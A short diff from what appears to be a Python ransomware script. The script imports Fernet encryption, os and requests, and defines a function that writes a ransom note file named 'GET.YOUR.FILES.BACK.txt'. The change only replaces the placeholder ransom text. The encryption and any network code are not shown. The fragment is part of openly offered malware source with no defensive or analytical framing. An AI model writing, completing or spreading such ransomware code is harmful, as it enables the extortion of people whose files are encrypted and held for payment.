@@ -3,7 +3,7 @@ from cryptography.fernet import Fernet
 import os
 import requests
 def ransom_message():
-    ransom_message = '''your message'''
+    ransom_message = '''type your message here'''
     ransom_message_txt = open("GET.YOUR.FILES.BACK.txt", 'w')
     ransom_message_txt.write(ransom_message)
     ransom_message_txt.close()
